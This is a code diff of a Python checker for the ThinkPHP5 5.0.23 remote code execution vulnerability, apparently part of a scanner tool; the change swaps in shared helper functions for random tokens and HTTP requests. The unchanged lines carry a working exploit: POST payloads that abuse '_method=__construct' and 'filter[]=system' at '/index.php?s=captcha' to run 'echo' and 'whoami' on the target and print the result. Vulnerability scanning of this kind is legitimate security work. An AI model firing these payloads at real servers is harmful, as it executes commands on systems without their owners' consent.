@@ -6,11 +6,8 @@ description: ThinkPHP5 5.0.23 远程代码执行漏洞
 '''
 
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class Thinkphp5_5_0_23_BaseVerify:
     def __init__(self, url):
@@ -19,10 +16,7 @@ class Thinkphp5_5_0_23_BaseVerify:
             'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
             'Content-Type': 'application/x-www-form-urlencoded'
         }
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.check_payload =  '''_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=''' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8')
         self.cmd_payload =  '''_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami'''
 
@@ -34,9 +28,9 @@ class Thinkphp5_5_0_23_BaseVerify:
                 self.url = self.url + '/index.php?s=captcha'
             if 'index.php' in self.url and '/?s=captcha' not in self.url:
                 self.url = self.url + '/?s=captcha'
-            check_req = requests.post(self.url, data = self.check_payload, headers = self.headers, allow_redirects = False, verify = False)
+            check_req = request.post(self.url, data = self.check_payload, headers = self.headers)
             if check_req.status_code == 200 and self.capta in check_req.text:
-                cmd_req = requests.post(self.url, data = self.cmd_payload, headers = self.headers, allow_redirects = False, verify = False)
+                cmd_req = request.post(self.url, data = self.cmd_payload, headers = self.headers)
                 print ('存在ThinkPHP5 5.0.23 远程代码执行漏洞,执行whoami命令成功，执行结果是:', cmd_req.text.split('\n')[0])
                 return True
             else:
